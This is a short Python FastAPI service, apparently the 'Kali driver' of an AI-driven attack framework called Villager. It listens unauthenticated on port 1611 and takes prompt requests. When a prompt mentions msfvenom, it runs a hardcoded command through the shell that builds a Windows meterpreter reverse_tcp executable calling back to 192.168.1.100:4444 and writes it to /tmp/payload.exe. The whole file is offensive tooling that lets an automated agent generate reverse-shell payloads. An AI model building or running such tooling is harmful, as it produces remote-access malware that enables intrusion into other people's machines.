#!/usr/bin/env python3
"""
Kali Driver Service for Villager
This service handles security tool execution requests on port 1611
"""

from fastapi import FastAPI
import uvicorn
import subprocess
import json

app = FastAPI(title="Villager Kali Driver Service")

@app.post("/")
async def kali_request(request: dict):
    """Handle Kali Driver requests for security tools"""
    prompt = request.get("prompt", "")
    
    print(f"Kali Driver received request: {prompt[:100]}...")
    
    # Check if this is a msfvenom request
    if "msfvenom" in prompt.lower():
        try:
            # Extract msfvenom command from prompt
            # For now, use a default command
            cmd = "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o /tmp/payload.exe"
            
            # Execute the command
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            
            response = {
                "content": f"Kali Driver executed: {cmd}\nOutput: {result.stdout}\nError: {result.stderr}",
                "done": True
            }
        except Exception as e:
            response = {
                "content": f"Kali Driver error: {str(e)}",
                "done": True
            }
    else:
        response = {
            "content": f"Kali Driver processed: {prompt[:50]}...",
            "done": True
        }
    
    return response

@app.get("/health")
async def health_check():
    """Health check endpoint"""
    return {"status": "healthy", "service": "kali_driver"}

if __name__ == "__main__":
    print("Starting Villager Kali Driver Service on port 1611...")
    uvicorn.run(app, host="0.0.0.0", port=1611)
